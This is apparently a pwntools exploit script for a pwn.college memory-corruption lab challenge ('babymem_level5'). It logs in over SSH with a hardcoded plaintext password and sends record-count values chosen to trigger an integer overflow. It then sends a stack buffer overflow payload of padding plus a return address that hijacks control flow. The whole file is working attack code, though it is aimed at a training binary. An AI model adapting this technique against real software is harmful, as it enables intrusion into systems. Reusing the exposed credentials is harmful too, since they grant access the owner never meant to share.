from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

context.log_level = 'debug'
p = s.process("./babymem_level5_testing1")
p.sendlineafter(b'Number of payload records to send:',b'5002')
p.sendlineafter(b'Size of each payload record:',b'858650')
pay = b'A'*0x98 + p64(0x401b32)
p.sendafter(b'bytes)!\n',pay)
p.interactive()